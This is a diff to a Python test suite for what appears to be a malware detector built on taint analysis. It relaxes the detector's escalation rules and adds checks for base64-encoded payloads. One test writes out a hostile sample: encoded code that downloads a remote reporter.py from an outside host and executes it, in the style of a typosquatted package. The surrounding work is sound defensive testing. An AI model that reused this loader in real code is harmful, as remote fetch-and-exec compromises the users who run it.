@@ -46,8 +46,12 @@ check("network→exec 升级",
       escalation_gate([chain('network_response', 'code_execution')]).startswith('污点链'))
 check("socket_recv→cmd 升级",
       escalation_gate([chain('socket_recv', 'command_execution')]).startswith('污点链'))
-check("deserialization→file_write 升级",
-      escalation_gate([chain('deserialization', 'file_write')]).startswith('污点链'))
+# 2026-11 规则 1 收紧：强源必须到达执行/外传 sink。
+# 反序列化→写文件 = 数据搬运（缓存序列化形态），降为弱链——
+# 见第 10 节（colcon/pyslack/twirp 误报驱动）。
+check("deserialization→file_write 降为弱链（规则 1 收紧）",
+      escalation_gate([chain('deserialization', 'file_write')]) == '',
+      detail=escalation_gate([chain('deserialization', 'file_write')]))
 check("decoded_data→network 升级",
       escalation_gate([chain('decoded_data', 'data_exfiltration')]).startswith('污点链'))
 
@@ -227,6 +231,47 @@ c4 = [x for x in taint("subprocess.run(['ls', '-la'])")
 check("普通 subprocess 不触发", len(c4) == 0)
 
 check("hardcoded_payload 在 STRONG_SOURCES", 'hardcoded_payload' in STRONG_SOURCES)
+
+print("=== 10. 升级门规则 1 收紧（500+500 网络客户端误报驱动）===")
+# colcon-metadata / pyslack / twirp 的形态：网络响应→写文件 = 下载器，
+# 良性工具每天都在做；dropper 的区别是下载内容最终被【执行】。
+check("网络响应→写文件 不再定罪",
+      escalation_gate([chain('network_response', 'file_write')]) == '',
+      detail=escalation_gate([chain('network_response', 'file_write')]))
+check("网络响应→代码执行 仍定罪",
+      escalation_gate([chain('network_response', 'code_execution')]) != '')
+check("网络响应→命令执行 仍定罪",
+      escalation_gate([chain('network_response', 'command_execution')]) != '')
+check("网络响应→外传 仍定罪",
+      escalation_gate([chain('network_response', 'data_exfiltration')]) != '')
+check("反序列化→代码执行 仍定罪",
+      escalation_gate([chain('deserialization', 'code_execution')]) != '')
+check("反序列化→写文件 降为弱链",
+      escalation_gate([chain('deserialization', 'file_write')]) == '',
+      detail=escalation_gate([chain('deserialization', 'file_write')]))
+check("敌意载荷→任意 sink 定罪（单节点证据例外）",
+      escalation_gate([chain('hardcoded_payload', 'file_write')]) != '')
+check("规则 2 不受影响：任意源→外传 定罪",
+      escalation_gate([chain('file_read', 'data_exfiltration')]) != '')
+
+print("=== 11. 编码载荷（requsets 族，2026-11）===")
+import base64 as _b64
+_real = _b64.b64encode(
+    b'exec(__import__("importlib").import_module("urllib.request")'
+    b'.urlopen("https://cyberresearch.pythonanywhere.com/reporter.py")'
+    b'.read().decode())').decode()
+c_enc = taint("exec(base64.b64decode(b'" + _real + "'))")
+hw_enc = [x for x in c_enc if x['source_category'] == 'hardcoded_payload']
+check("base64 编码的远程加载载荷 → hardcoded_payload", len(hw_enc) == 1,
+      detail=str([c['source_category'] for c in c_enc]))
+check("payload_kind 标为 encoded_remote_fetch",
+      bool(hw_enc) and hw_enc[0].get('payload_kind') == 'encoded_remote_fetch',
+      detail=str(hw_enc[0].get('payload_kind') if hw_enc else None))
+check("编码载荷通过升级门", bool(escalation_gate(hw_enc)))
+_benign = _b64.b64encode(b'{"name": "requests", "version": "2.31.0", "author": "Kenneth"}').decode()
+c_ok = [x for x in taint("data = base64.b64decode(b'" + _benign + "')")
+        if x['source_category'] == 'hardcoded_payload']
+check("良性 base64 数据不触发", len(c_ok) == 0, detail=str(len(c_ok)))
 
 print(f"\n结果: {PASS} 通过, {FAIL} 失败")
 sys.exit(1 if FAIL else 0)
